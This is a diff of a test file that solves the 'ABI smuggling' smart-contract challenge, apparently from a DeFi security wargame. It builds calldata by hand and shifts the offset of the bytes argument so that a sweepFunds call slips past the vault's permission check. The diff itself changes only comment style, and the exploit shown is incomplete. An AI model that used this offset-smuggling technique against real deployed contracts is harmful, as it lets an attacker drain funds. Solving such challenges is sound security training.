@@ -46,21 +46,25 @@ describe('[Challenge] ABI smuggling', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
 
-        // We're going to make our call to the execute function manually
-        // In order to smuggle the abi
-        // Get the firsts 4 bytes of our call
-        // They're gonna be the execute function selector
+        /*
+            We're going to make our call to the execute function manually
+            In order to smuggle the abi
+            Get the firsts 4 bytes of our call
+            They're gonna be the execute function selector
+        */
         const executeFunction = await vault.interface.getFunction("execute");
         const executeSelector = await vault.interface.getSighash(executeFunction);
 
         // Get the first argument with a padding of 32 bytes
         const vaultAddress = await ethers.utils.hexZeroPad(vault.address, 32);
 
-        // The second argument are bytes
-        // Because the bytes it's a dynamic type of data it has an offset and a size
-        // The function execute check in a fixed position where the function selector is
-        // If we change the offset of the bytes to where starts our true function
-        // We can smuggle the function sweepFunds bypassing the permission checker
+        /*
+            The second argument are bytes
+            Because the bytes it's a dynamic type of data it has an offset and a size
+            The function execute check in a fixed position where the function selector is
+            If we change the offset of the bytes to where starts our true function
+            We can smuggle the function sweepFunds bypassing the permission checker
+        */
         const newOffset = await ethers.utils.hexZeroPad("0x64", 32);
 
         // Next we're going to fill the next 32 bytes with empty data
